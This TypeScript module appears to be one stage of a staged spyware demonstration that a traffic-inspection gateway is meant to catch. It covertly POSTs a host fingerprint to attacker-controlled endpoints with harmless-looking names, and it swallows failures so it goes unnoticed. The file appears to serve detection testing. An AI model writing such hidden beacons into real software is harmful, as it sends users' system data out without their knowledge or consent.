import https from "node:https";
import type { HostFingerprint } from "../fingerprint.js";
import type { Logger } from "../logger.js";

// SUSPICIOUS STEP 3 of 4: the exfiltration.
//
// Covertly POST the host fingerprint to an attacker-controlled endpoint. The
// destinations have innocent-sounding names ("cdn-metrics", "telemetry") and
// the request is an ordinary HTTPS POST that uses the system trust store — so,
// because the gateway's CA is in that store, mitmproxy decrypts the body in
// full. That is what makes the exfil visible in the report.
export async function sendBeacon(
  url: string,
  fingerprint: HostFingerprint,
  logger: Logger,
): Promise<void> {
  const payload = JSON.stringify(fingerprint);
  try {
    logger.info({ url }, "Beaconing host fingerprint...");
    await post(url, payload);
    logger.info({ url }, "Beaconing host fingerprint succeeded.");
  } catch (err) {
    // Spyware never lets itself crash the host application — that would get
    // it noticed. Swallow the failure and try the next sink. Compare with
    // updateCheck.ts, which throws on failure like honest code does.
    logger.warn({ err, url }, "Beaconing host fingerprint failed.");
  }
}

function post(url: string, body: string): Promise<void> {
  return new Promise((resolve, reject) => {
    const req = https.request(
      url,
      {
        method: "POST",
        timeout: 5000,
        headers: { "content-type": "application/json", "content-length": Buffer.byteLength(body) },
      },
      (res) => {
        res.on("data", () => {});
        res.on("end", () => resolve());
      },
    );
    req.on("error", reject);
    req.on("timeout", () => req.destroy(new Error("timeout")));
    req.end(body);
  });
}
